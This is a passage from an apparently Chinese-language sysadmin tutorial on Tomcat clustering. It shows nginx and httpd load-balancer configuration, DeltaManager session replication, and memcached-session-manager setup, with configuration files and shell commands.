/&gt;</span><br><span class="line">    &lt;Engine name=&quot;Catalina&quot; defaultHost=&quot;node2.fenghong.tech&quot; jvmRoute=&quot;TomcatB&quot;&gt;</span><br><span class="line">      &lt;Host name=&quot;node2.fenghong.tech&quot; appBase=&quot;/data/webapp&quot; unpackWARs=&quot;true&quot; autoDeploy=&quot;true&quot;&gt;</span><br><span class="line">        &lt;Valve className=&quot;org.apache.catalina.valves.AccessLogValve&quot; directory=&quot;logs&quot;</span><br><span class="line">               prefix=&quot;node2-dongfei-tech_access.&quot; suffix=&quot;.log&quot;</span><br><span class="line">               pattern=&quot;%h %l %u %t &amp;quot;%r&amp;quot; %s %b&quot; /&gt;</span><br><span class="line">          &lt;/Host&gt;</span><br><span class="line">    &lt;/Engine&gt;</span><br><span class="line">  &lt;/Service&gt;</span><br><span class="line">&lt;/Server&gt;</span><br><span class="line">[root@tomcat-node-2 ~]# vim /data/webapp/ROOT/index.jsp </span><br><span class="line">&lt;%@ page language=&quot;java&quot; %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;&lt;title&gt;TomcatB&lt;/title&gt;&lt;/head&gt;</span><br><span class="line">        &lt;body&gt;</span><br><span class="line">        &lt;h1&gt;&lt;font color=&quot;blue&quot;&gt;TomcatB.fenghong.tech&lt;/font&gt;&lt;/h1&gt;</span><br><span class="line">        &lt;table align=&quot;centre&quot; border=&quot;1&quot;&gt;</span><br><span class="line">            &lt;tr&gt;</span><br><span class="line">                &lt;td&gt;Session ID&lt;/td&gt;</span><br><span class="line">            &lt;% session.setAttribute(&quot;fenghong.tech&quot;,&quot;fenghong.tech&quot;); %&gt;</span><br><span class="line">                &lt;td&gt;&lt;%= session.getId() %&gt;&lt;/td&gt;</span><br><span class="line">            &lt;/tr&gt;</span><br><span class="line">            &lt;tr&gt;</span><br><span class="line">                &lt;td&gt;Created on&lt;/td&gt;</span><br><span class="line">                &lt;td&gt;&lt;%= session.getCreationTime() %&gt;&lt;/td&gt;</span><br><span class="line">            &lt;/tr&gt;</span><br><span class="line">        &lt;/table&gt;</span><br><span class="line">        &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">[root@tomcat-node-2 ~]# systemctl start nginx tomcat</span><br></pre></td></tr></table></figure><blockquote><p>测试访问：<a href="http://www.fenghong.tech/；实现同一cookie的客户端调度到同一后端server上" target="_blank" rel="noopener">http://www.fenghong.tech/；实现同一cookie的客户端调度到同一后端server上</a></p></blockquote><ul><li>httpd反代启用管理接口：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;Location /balancer-manager&gt;</span><br><span class="line">SetHandler balancer-manager</span><br><span class="line">ProxyPass !</span><br><span class="line">Require all granted</span><br><span class="line">&lt;/Location&gt;</span><br></pre></td></tr></table></figure><h2 id="nginx-nginx-tomcat-cluster：基于源地址hash调度"><a href="#nginx-nginx-tomcat-cluster：基于源地址hash调度" class="headerlink" title="nginx + nginx + tomcat cluster：基于源地址hash调度"></a>nginx + nginx + tomcat cluster：基于源地址hash调度</h2><p>前端nginx调度器：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[root@Director ~]# vim /etc/nginx/conf.d/nginx_tomcat.conf</span><br><span class="line">upstream tcsrvs &#123;</span><br><span class="line">        ip_hash;</span><br><span class="line">        server 192.168.0.10:80;</span><br><span class="line">        server 192.168.0.11:80;</span><br><span class="line">&#125;</span><br><span class="line">server &#123;</span><br><span class="line">        listen 80;</span><br><span class="line">        server_name www.fenghong.tech;</span><br><span class="line">        location / &#123;</span><br><span class="line">                proxy_pass http://tcsrvs;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">[root@Director ~]# nginx</span><br></pre></td></tr></table></figure><p>tomcat-node-1和tomcat-node-2：参考以上配置</p><blockquote><p>测试访问：<a href="http://www.fenghong.tech/；实现同一IP的客户端调度到同一后端server上" target="_blank" rel="noopener">http://www.fenghong.tech/；实现同一IP的客户端调度到同一后端server上</a></p></blockquote><h1 id="Tomcat的会话集群"><a href="#Tomcat的会话集群" class="headerlink" title="Tomcat的会话集群"></a>Tomcat的会话集群</h1><ul><li>session cluster：delta session manager；会话集群，对带宽消耗较大，集群规模建议3-5台</li></ul><ol><li>默认多播地址：228.0.0.4</li><li>多播通信使用的端口：45564</li><li>IP广播的方式来实现获取主机名，主机IP地址等，不能是监听在127.0.0.1</li><li>侦听复制消息的TCP端口是范围：4000-4100</li><li>必须配置集群会话监听器</li><li><p>各集群时间必须同步</p><p><img src="/images/nntm.png" alt="img"> </p></li></ol><p>前端nginx配置：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">upstream tcsrvs &#123;</span><br><span class="line">        server 192.168.0.10:80;</span><br><span class="line">        server 192.168.0.11:80;</span><br><span class="line">&#125;</span><br><span class="line">server &#123;</span><br><span class="line">        listen 80;</span><br><span class="line">        server_name www.fenghong.tech;</span><br><span class="line">        location / &#123;</span><br><span class="line">                proxy_pass http://tcsrvs;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>tomcat-node-1：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">[root@tomcat-node-1 ~]# vim /etc/tomcat/server.xml</span><br><span class="line">      &lt;Host name=&quot;node1.fenghong.tech&quot; appBase=&quot;/data/webapp&quot; unpackWARs=&quot;true&quot; autoDeploy=&quot;true&quot;&gt;</span><br><span class="line">        &lt;Cluster className=&quot;org.apache.catalina.ha.tcp.SimpleTcpCluster&quot;</span><br><span class="line">                 channelSendOptions=&quot;8&quot;&gt;</span><br><span class="line">#channelSendOptions：发送消息的信道选项，0-15</span><br><span class="line">          &lt;Manager className=&quot;org.apache.catalina.ha.session.DeltaManager&quot;</span><br><span class="line">                   expireSessionsOnShutdown=&quot;false&quot;</span><br><span class="line">                   notifyListenersOnReplication=&quot;true&quot;/&gt;</span><br><span class="line">#Manager：定义新的会话管理器DeltaManager</span><br><span class="line">#expireSessionsOnShutdown：一旦把当前Tomcat节点关闭，是否将这节点的Tomcat会话失效，false表示不失效</span><br><span class="line">#notifyListenersOnReplication：现在如果要发送资源同步给其他节点，是否通知侦听器资源变动，必须打开</span><br><span class="line">          &lt;Channel className=&quot;org.apache.catalina.tribes.group.GroupChannel&quot;&gt;</span><br><span class="line">            &lt;Membership className=&quot;org.apache.catalina.tribes.membership.McastService&quot;</span><br><span class="line">                        address=&quot;228.0.0.4&quot;</span><br><span class="line">                        port=&quot;45564&quot;</span><br><span class="line">                        frequency=&quot;500&quot;</span><br><span class="line">                        dropTime=&quot;3000&quot;/&gt;</span><br><span class="line">             #McastService：多播通信</span><br><span class="line">             #address：多播通信地址</span><br><span class="line">             #port：端口</span><br><span class="line">             #frequency：每隔多长时间发送一次自己的心跳信息，单位ms</span><br><span class="line">             #dropTime：在3000ms内没有收到对方的心跳信息表示已经不是集群成员了</span><br><span class="line">            &lt;Receiver className=&quot;org.apache.catalina.tribes.transport.nio.NioReceiver&quot;</span><br><span class="line">                      address=&quot;192.168.0.10&quot;</span><br><span class="line">                      port=&quot;4000&quot;</span><br><span class="line">                      autoBind=&quot;100&quot;</span><br><span class="line">                      selectorTimeout=&quot;5000&quot;</span><br><span class="line">                      maxThreads=&quot;6&quot;/&gt;</span><br><span class="line">             #NioReceiver：异步IO</span><br><span class="line">             #address：监听地址，需要修改为集群成员通信的网卡</span><br><span class="line">             #port：端口，如果不指定则自动选择4000-4100内从4000开始选择一个没有被占用的端口</span><br><span class="line">             #autoBind：自动绑定</span><br><span class="line">             #selectorTimeout：挑选器的超时时长</span><br><span class="line">             #maxThreads：最大线程数，集群成员节点数 - 1</span><br><span class="line">            &lt;Sender className=&quot;org.apache.catalina.tribes.transport.ReplicationTransmitter&quot;&gt;</span><br><span class="line">              &lt;Transport className=&quot;org.apache.catalina.tribes.transport.nio.PooledParallelSender&quot;/&gt;</span><br><span class="line">            &lt;/Sender&gt;</span><br><span class="line">            &lt;Interceptor className=&quot;org.apache.catalina.tribes.group.interceptors.TcpFailureDetector&quot;/&gt;</span><br><span class="line">            &lt;Interceptor className=&quot;org.apache.catalina.tribes.group.interceptors.MessageDispatch15Interceptor&quot;/&gt;</span><br><span class="line">          &lt;/Channel&gt;</span><br><span class="line">#Channel：定义多播集群通信信道</span><br><span class="line">#Membership：定义成员关系</span><br><span class="line">#Receiver：接受器</span><br><span class="line">#Sender：将自己的会话资源变动同步给其他节点</span><br><span class="line">          &lt;Valve className=&quot;org.apache.catalina.ha.tcp.ReplicationValve&quot;</span><br><span class="line">                 filter=&quot;&quot;/&gt;</span><br><span class="line">          &lt;Valve className=&quot;org.apache.catalina.ha.session.JvmRouteBinderValve&quot;/&gt;</span><br><span class="line"></span><br><span class="line">          &lt;Deployer className=&quot;org.apache.catalina.ha.deploy.FarmWarDeployer&quot;</span><br><span class="line">                    tempDir=&quot;/tmp/war-temp/&quot;</span><br><span class="line">                    deployDir=&quot;/tmp/war-deploy/&quot;</span><br><span class="line">                    watchDir=&quot;/tmp/war-listen/&quot;</span><br><span class="line">                    watchEnabled=&quot;false&quot;/&gt;</span><br><span class="line">          &lt;ClusterListener className=&quot;org.apache.catalina.ha.session.JvmRouteSessionIDBinderListener&quot;/&gt;</span><br><span class="line">          &lt;ClusterListener className=&quot;org.apache.catalina.ha.session.ClusterSessionListener&quot;/&gt;</span><br><span class="line">        &lt;/Cluster&gt;</span><br><span class="line">        &lt;Valve className=&quot;org.apache.catalina.valves.AccessLogValve&quot; directory=&quot;logs&quot;</span><br><span class="line">               prefix=&quot;node1-dongfei-tech_access.&quot; suffix=&quot;.log&quot;</span><br><span class="line">               pattern=&quot;%h %l %u %t &amp;quot;%r&amp;quot; %s %b&quot; /&gt;</span><br><span class="line">          &lt;/Host&gt;</span><br><span class="line">[root@tomcat-node-1 ~]# mkdir /data/webapp/ROOT/WEB-INF</span><br><span class="line">[root@tomcat-node-1 ~]# cp /etc/tomcat/web.xml /data/webapp/ROOT/WEB-INF/</span><br><span class="line">[root@tomcat-node-1 ~]# vim /data/webapp/ROOT/WEB-INF/web.xml</span><br><span class="line">    &lt;distributable/&gt;  #添加到web-app内</span><br><span class="line">[root@tomcat-node-1 ~]# systemctl restart tomcat</span><br></pre></td></tr></table></figure><p>tomcat-node-2：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">[root@tomcat-node-2 ~]# vim /etc/tomcat/server.xml</span><br><span class="line">      &lt;Host name=&quot;node2.fenghong.tech&quot; appBase=&quot;/data/webapp&quot; unpackWARs=&quot;true&quot; autoDeploy=&quot;true&quot;&gt;</span><br><span class="line">        &lt;Cluster className=&quot;org.apache.catalina.ha.tcp.SimpleTcpCluster&quot;</span><br><span class="line">                 channelSendOptions=&quot;8&quot;&gt;</span><br><span class="line">          &lt;Manager className=&quot;org.apache.catalina.ha.session.DeltaManager&quot;</span><br><span class="line">                   expireSessionsOnShutdown=&quot;false&quot;</span><br><span class="line">                   notifyListenersOnReplication=&quot;true&quot;/&gt;</span><br><span class="line">          &lt;Channel className=&quot;org.apache.catalina.tribes.group.GroupChannel&quot;&gt;</span><br><span class="line">            &lt;Membership className=&quot;org.apache.catalina.tribes.membership.McastService&quot;</span><br><span class="line">                        address=&quot;228.0.0.4&quot;</span><br><span class="line">                        port=&quot;45564&quot;</span><br><span class="line">                        frequency=&quot;500&quot;</span><br><span class="line">                        dropTime=&quot;3000&quot;/&gt;</span><br><span class="line">            &lt;Receiver className=&quot;org.apache.catalina.tribes.transport.nio.NioReceiver&quot;</span><br><span class="line">                      address=&quot;192.168.0.11&quot;</span><br><span class="line">                      port=&quot;4000&quot;</span><br><span class="line">                      autoBind=&quot;100&quot;</span><br><span class="line">                      selectorTimeout=&quot;5000&quot;</span><br><span class="line">                      maxThreads=&quot;6&quot;/&gt;</span><br><span class="line">            &lt;Sender className=&quot;org.apache.catalina.tribes.transport.ReplicationTransmitter&quot;&gt;</span><br><span class="line">              &lt;Transport className=&quot;org.apache.catalina.tribes.transport.nio.PooledParallelSender&quot;/&gt;</span><br><span class="line">            &lt;/Sender&gt;</span><br><span class="line">            &lt;Interceptor className=&quot;org.apache.catalina.tribes.group.interceptors.TcpFailureDetector&quot;/&gt;</span><br><span class="line">            &lt;Interceptor className=&quot;org.apache.catalina.tribes.group.interceptors.MessageDispatch15Interceptor&quot;/&gt;</span><br><span class="line">          &lt;/Channel&gt;</span><br><span class="line">          &lt;Valve className=&quot;org.apache.catalina.ha.tcp.ReplicationValve&quot;</span><br><span class="line">                 filter=&quot;&quot;/&gt;</span><br><span class="line">          &lt;Valve className=&quot;org.apache.catalina.ha.session.JvmRouteBinderValve&quot;/&gt;</span><br><span class="line">          &lt;Deployer className=&quot;org.apache.catalina.ha.deploy.FarmWarDeployer&quot;</span><br><span class="line">                    tempDir=&quot;/tmp/war-temp/&quot;</span><br><span class="line">                    deployDir=&quot;/tmp/war-deploy/&quot;</span><br><span class="line">                    watchDir=&quot;/tmp/war-listen/&quot;</span><br><span class="line">                    watchEnabled=&quot;false&quot;/&gt;</span><br><span class="line">          &lt;ClusterListener className=&quot;org.apache.catalina.ha.session.JvmRouteSessionIDBinderListener&quot;/&gt;</span><br><span class="line">          &lt;ClusterListener className=&quot;org.apache.catalina.ha.session.ClusterSessionListener&quot;/&gt;</span><br><span class="line">        &lt;/Cluster&gt;</span><br><span class="line">        &lt;Valve className=&quot;org.apache.catalina.valves.AccessLogValve&quot; directory=&quot;logs&quot;</span><br><span class="line">               prefix=&quot;node2-dongfei-tech_access.&quot; suffix=&quot;.log&quot;</span><br><span class="line">               pattern=&quot;%h %l %u %t &amp;quot;%r&amp;quot; %s %b&quot; /&gt;</span><br><span class="line">          &lt;/Host&gt;</span><br><span class="line">[root@tomcat-node-2 ~]# mkdir /data/webapp/ROOT/WEB-INF</span><br><span class="line">[root@tomcat-node-2 ~]# cp /etc/tomcat/web.xml /data/webapp/ROOT/WEB-INF</span><br><span class="line">[root@tomcat-node-2 ~]# vim /data/webapp/ROOT/WEB-INF/web.xml</span><br><span class="line">    &lt;distributable/&gt;  #添加到web-app内</span><br><span class="line">[root@tomcat-node-2 ~]# systemctl restart tomcat</span><br></pre></td></tr></table></figure><blockquote><p>需要在前端调度器做将会话绑定，配置后端的Tomcat会话集群一同使用</p></blockquote><h1 id="使用mencached保存Tomcat会话信息"><a href="#使用mencached保存Tomcat会话信息" class="headerlink" title="使用mencached保存Tomcat会话信息"></a>使用mencached保存Tomcat会话信息</h1><ul><li>session server：redis(store), memcached(cache)；利用会话服务器保存会话信息</li></ul><p><img src="/images/tomcat-session-memcached.png" alt="img"> </p><p>mencached配置：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@mem-1 ~]# yum install memcached -y</span><br><span class="line">[root@mem-1 ~]# systemctl start memcached</span><br><span class="line">[root@mem-1 ~]# ss -tnl |grep 11211</span><br><span class="line">LISTEN     0      128          *:11211                    *:*</span><br><span class="line">LISTEN     0      128         :::11211                   :::*</span><br></pre></td></tr></table></figure><p>msm配置：在tomcat服务器中配置</p><p>项目地址：<a href="https://github.com/magro/memcached-session-manager" target="_blank" rel="noopener">https://github.com/magro/memcached-session-manager</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">[root@tomcat-node-1 ~]# mkdir msm</span><br><span class="line">[root@tomcat-node-1 ~]# cd msm</span><br><span class="line">[root@tomcat-node-1 msm]# wget http://repo1.maven.org/maven2/de/javakaffee/msm/memcached-session-manager/2.3.0/memcached-session-manager-2.3.0.jar</span><br><span class="line">[root@tomcat-node-1 msm]# wget http://repo1.maven.org/maven2/de/javakaffee/msm/memcached-session-manager-tc7/2.3.0/memcached-session-manager-tc7-2.3.0.jar</span><br><span class="line">[root@tomcat-node-1 msm]# wget http://repo1.maven.org/maven2/net/spy/spymemcached/2.12.3/spymemcached-2.12.3.jar</span><br><span class="line">[root@tomcat-node-1 msm]# mkdir kryo</span><br><span class="line">[root@tomcat-node-1 msm]# cd kryo/</span><br><span class="line">[root@tomcat-node-1 kryo]# wget http://repo1.maven.org/maven2/de/javakaffee/msm/msm-kryo-serializer/2.3.0/msm-kryo-serializer-2.3.0.jar</span><br><span class="line">[root@tomcat-node-1 kryo]# wget http://repo1.maven.org/maven2/de/javakaffee/kryo-serializers/0.42/kryo-serializers-0.42.jar</span><br><span class="line">[root@tomcat-node-1 kryo]# wget http://repo1.maven.org/maven2/com/esotericsoftware/kryo/4.0.2/kryo-4.0.2.jar</span><br><span class="line">[root@tomcat-node-1 kryo]# wget http://repo1.maven.org/maven2/com/esotericsoftware/minlog/1.3.0/minlog-1.3.0.jar</span><br><span class="line">[root@tomcat-node-1 kryo]# wget http://repo1.maven.org/maven2/com/esotericsoftware/reflectasm/1.11.7/reflectasm-1.11.7.jar</span><br><span class="line">[root@tomcat-node-1 kryo]# wget http://repo1.maven.org/maven2/org/ow2/asm/asm/6.2/asm-6.2.jar</span><br><span class="line">[root@tomcat-node-1 kryo]# wget http://repo1.maven.org/maven2/org/objenesis/objenesis/2.6/objenesis-2.6.jar</span><br><span class="line">[root@tomcat-node-1 ~]# tree msm/</span><br><span class="line">msm/</span><br><span class="line">├── kryo</span><br><span class="line">│   ├── asm-6.2.jar</span><br><span class="line">│   ├── kryo-4.0.2.jar</span><br><span class="line">│   ├── kryo-serializers-0.42.jar</span><br><span class="line">│   ├── minlog-1.3.0.jar</span><br><span class="line">│   ├── msm-kryo-serializer-2.3.0.jar</span><br><span class="line">│   ├── objenesis-2.6.jar</span><br><span class="line">│   └── reflectasm-1.11.7.jar</span><br><span class="line">├── memcached-session-manager-2.3.0.jar</span><br><span class="line">├── memcached-session-manager-tc7-2.3.0.jar</span><br><span class="line">└── spymemcached-2.12.3.jar</span><br><span class="line">[root@tomcat-node-1 ~]# cp msm/*.jar /usr/share/java/tomcat/</span><br><span class="line">[root@tomcat-node-1 ~]# scp msm/*.jar 192.168.0.11:/usr/share/java/tomcat/</span><br><span class="line">[root@tomcat-node-1 ~]# scp msm/kryo/*.jar 192.168.0.11:/usr/share/java/tomcat/</span><br></pre></td></tr></table></figure><p>tomcat-1配置：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">[root@tomcat-node-1 ~]# vim /etc/tomcat/server.xml</span><br><span class="line">&lt;Host name=&quot;node1.fenghong.tech&quot; appBase=&quot;/data/webapp&quot; unpackWARs=&quot;true&quot; autoDeploy=&quot;true&quot;&gt;</span><br><span class="line">  &lt;Context path=&quot;/&quot; docBase=&quot;ROOT&quot; reloadable=&quot;&quot;&gt;</span><br><span class="line">    &lt;Manager className=&quot;de.javakaffee.web.msm.MemcachedBackupSessionManager&quot;</span><br><span class="line">      memcachedNodes=&quot;n1:192.168.0.12:11211,n2:192.168.0.13:11211&quot;</span><br><span class="line">      failoverNodes=&quot;n2&quot;</span><br><span class="line">      requestUriIgnorePattern=&quot;.*\.(ico|png|gif|jpg|css|js)$&quot;</span><br><span class="line">      transcoderFactoryClass=&quot;de.javakaffee.web.msm.serializer.kryo.KryoTranscoderFactory&quot;</span><br><span class="line">      /&gt;</span><br><span class="line">  &lt;/Context&gt;</span><br><span class="line">  &lt;Valve className=&quot;org.apache.catalina.valves.AccessLogValve&quot; directory=&quot;logs&quot;</span><br><span class="line">         prefix=&quot;node1-dongfei-tech_access.&quot; suffix=&quot;.log&quot;</span><br><span class="line">         pattern=&quot;%h %l %u %t &amp;quot;%r&amp;quot; %s %b&quot; /&gt;</span><br><span class="line">&lt;/Host&gt;</span><br><span class="line">[root@tomcat-node-1 ~]# cat /data/webapp/ROOT/index.jsp </span><br><span class="line">&lt;%@ page language=&quot;java&quot; %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">        &lt;head&gt;&lt;title&gt;TomcatA&lt;/title&gt;&lt;/head&gt;</span><br><span class="line">        &lt;body&gt;</span><br><span class="line">                &lt;h1&gt;&lt;font color=&quot;red&quot;&gt;TomcatA.fenghong.tech&lt;/font&gt;&lt;/h1&gt;</span><br><span class="line">                &lt;table align=&quot;centre&quot; border=&quot;1&quot;&gt;</span><br><span class="line">                        &lt;tr&gt;</span><br><span class="line">                                &lt;td&gt;Session ID&lt;/td&gt;</span><br><span class="line">                        &lt;% session.setAttribute(&quot;fenghong.tech&quot;,&quot;fenghong.tech&quot;); %&gt;</span><br><span class="line">                                &lt;td&gt;&lt;%= session.getId() %&gt;&lt;/td&gt;</span><br><span class="line">                        &lt;/tr&gt;</span><br><span class="line">                        &lt;tr&gt;</span><br><span class="line">                                &lt;td&gt;Created on&lt;/td&gt;</span><br><span class="line">                                &lt;td&gt;&lt;%= session.getCreationTime() %&gt;&lt;/td&gt;</span><br><span class="line">                        &lt;/tr&gt;</span><br><span class="line">                &lt;/table&gt;</span><br><span class="line">        &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>tomcat-2配置：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">[root@tomcat-node-2 ~]# vim /etc/tomcat/server.xml</span><br><span class="line">&lt;Host name=&quot;node2.fenghong.tech&quot; appBase=&quot;/data/webapp&quot; unpackWARs=&quot;true&quot; autoDeploy=&quot;true&quot;&gt;</span><br><span class="line">  &lt;Context path=&quot;/&quot; docBase=&quot;ROOT&quot; reloadable=&quot;&quot;&gt;</span><br><span class="line">    &lt;Manager className=&quot;de.javakaffee.web.msm.MemcachedBackupSessionManager&quot;</span><br><span class="line">      memcachedNodes=&quot;n1:192.168.0.12:11211,n2:192.168.0.13:11211&quot;</span><br><span class="line">      failoverNodes=&quot;n2&quot;</span><br><span class="line">      requestUriIgnorePattern=&quot;.*\.(ico|png|gif|jpg|css|js)$&quot;</span><br><span class="line">      transcoderFactoryClass=&quot;de.javakaffee.web.msm.serializer.kryo.KryoTranscoderFactory&quot;</span><br><span class="line">      /&gt;</span><br><span class="line">  &lt;/Context&gt;</span><br><span class="line">  &lt;Valve className=&quot;org.apache.catalina.valves.AccessLogValve&quot; directory=&quot;logs&quot;</span><br><span class="line">         prefix=&quot;node2-dongfei-tech_access.&quot; suffix=&quot;.log&quot;</span><br><span class="line">         pattern=&quot;%h %l %u %t &amp;quot;%r&amp;quot; %s %b&quot; /&gt;</span><br><span class="line">&lt;/Host&gt;</span><br><span class="line">[root@tomcat-node-2 ~]# cat /data/webapp/ROOT/index.jsp </span><br><span class="line">&lt;%@ page language=&quot;java&quot; %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">        &lt;head&gt;&lt;title&gt;TomcatB&lt;/title&gt;&lt;/head&gt;</span><br><span class="line">                &lt;body&gt;</span><br><span class="line">                &lt;h1&gt;&lt;font color=&quot;blue&quot;&gt;TomcatB.fenghong.tech&lt;/font&gt;&lt;/h1&gt;</span><br><span class="line">                &lt;table align=&quot;centre&quot; border=&quot;1&quot;&gt;</span><br><span class="line">                        &lt;tr&gt;</span><br><span class="line">                                &lt;td&gt;Session ID&lt;/td&gt;</span><br><span class="line">                        &lt;% session.setAttribute(&quot;fenghong.tech&quot;,&quot;fenghong.tech&quot;); %&gt;</span><br><span class="line">                                &lt;td&gt;&lt;%= session.getId() %&gt;&lt;/td&gt;</span><br><span class="line">                        &lt;/tr&gt;</span><br><span class="line">                        &lt;tr&gt;</span><br><span class="line">                                &lt;td&gt;Created on&lt;/td&gt;</span><br><span class="line">                                &lt;td&gt;&lt;%= session.getCreationTime() %&gt;&lt;/td&gt;</span><br><span class="line">                        &lt;/tr&gt;</span><br><span class="line">                &lt;/table&gt;</span><br><span class="line">                &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><blockquote><p>测试：</p><p>访问<a href="http://www.fenghong.tech查看会话是否会变动" target="_blank" rel="noopener">www.fenghong.tech查看会话是否会变动</a></p><p>将memcached-1停止会话是否正常保持</p></blockquote><h1 id="Tomcat的常用优化配置"><a href="#Tomcat的常用优化配置" class="headerlink" title="Tomcat的常用优化配置"></a>Tomcat的常用优化配置</h1><ul><li>/etc/sysconfig/tomcat, /etc/tomcat/tomcat.conf</li></ul><p>内存空间：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 